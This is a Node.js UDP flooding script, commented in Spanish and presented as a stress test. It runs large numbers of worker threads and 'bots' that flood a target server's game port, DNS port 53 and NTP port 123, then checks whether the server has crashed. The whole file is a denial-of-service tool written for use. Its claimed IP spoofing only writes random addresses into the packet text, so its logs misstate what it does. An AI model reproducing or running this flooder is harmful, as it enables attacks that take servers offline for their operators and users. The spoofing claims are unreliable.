const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const dgram = require('dgram');

if (isMainThread) {
    // Código principal
    const args = process.argv.slice(2);
    const serverAddress = args[0] || '127.0.0.1'; // IP del servidor
    const serverPort = parseInt(args[1], 10) || 19132; // Puerto del servidor
    const numBots = parseInt(args[2], 10) || 1000000; // Número de bots
    const pps = parseInt(args[3], 10) || 1000000; // Paquetes por segundo por bot
    const duration = parseInt(args[4], 10) || 1000000; // Duración en segundos (hasta 1M de segundos)
    const numThreads = parseInt(args[5], 10) || 1000000; // Número de hilos (hasta 1M de hilos)

    for (let i = 0; i < numThreads; i++) {
        new Worker(__filename, {
            workerData: { serverAddress, serverPort, numBots, pps, duration }
        });
    }
} else {
    // Código del trabajador
    const { serverAddress, serverPort, numBots, pps, duration } = workerData;
    const udpClient = dgram.createSocket('udp4');

    function getRandomIp() {
        return `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
    }

    function sendUdpPacket(botId, packetId) {
        const spoofedIp = getRandomIp();
        const message = Buffer.from(`Bot ${botId} - Paquete UDP ${packetId} desde ${spoofedIp}`);
        udpClient.send(message, 0, message.length, serverPort, serverAddress, (err) => {
            if (err) {
                console.error(`Bot ${botId}: Error al enviar paquete UDP ${packetId} - ${err.message}`);
            } else {
                console.log(`Bot ${botId}: Enviando paquete UDP ${packetId} desde ${spoofedIp} a ${serverAddress}:${serverPort}`);
            }
        });
    }

    function sendDnsPacket(botId, packetId) {
        const spoofedIp = getRandomIp();
        const message = Buffer.from(`Bot ${botId} - Paquete DNS ${packetId} desde ${spoofedIp}`);
        udpClient.send(message, 0, message.length, 53, serverAddress, (err) => {
            if (err) {
                console.error(`Bot ${botId}: Error al enviar paquete DNS ${packetId} - ${err.message}`);
            } else {
                console.log(`Bot ${botId}: Enviando paquete DNS ${packetId} desde ${spoofedIp} a ${serverAddress}:53`);
            }
        });
    }

    function sendNtpPacket(botId, packetId) {
        const spoofedIp = getRandomIp();
        const message = Buffer.from(`Bot ${botId} - Paquete NTP ${packetId} desde ${spoofedIp}`);
        udpClient.send(message, 0, message.length, 123, serverAddress, (err) => {
            if (err) {
                console.error(`Bot ${botId}: Error al enviar paquete NTP ${packetId} - ${err.message}`);
            } else {
                console.log(`Bot ${botId}: Enviando paquete NTP ${packetId} desde ${spoofedIp} a ${serverAddress}:123`);
            }
        });
    }

    function checkServerStatus() {
        const message = Buffer.from('Ping');
        udpClient.send(message, 0, message.length, serverPort, serverAddress, (err) => {
            if (err) {
                console.error(`Error al verificar el estado del servidor: ${err.message}`);
            }
        });

        udpClient.once('message', (msg) => {
            console.log(`Servidor responde: ${msg.toString()}`);
        });

        setTimeout(() => {
            console.error('El servidor está offline o ha crasheado.');
            process.exit(1);
        }, 5000); // Espera 5 segundos para la respuesta del servidor
    }

    for (let botId = 0; botId < numBots; botId++) {
        let packetId = 0;
        const interval = setInterval(() => {
            sendUdpPacket(botId, packetId);
            sendDnsPacket(botId, packetId);
            sendNtpPacket(botId, packetId);
            packetId++;
        }, 1000 / pps);

        setTimeout(() => {
            clearInterval(interval);
            if (botId === numBots - 1) {
                udpClient.close();
                console.log("Prueba de estrés completada.");
            }
        }, duration * 1000);
    }

    setInterval(checkServerStatus, 10000); // Verifica el estado del servidor cada 10 segundos
            }
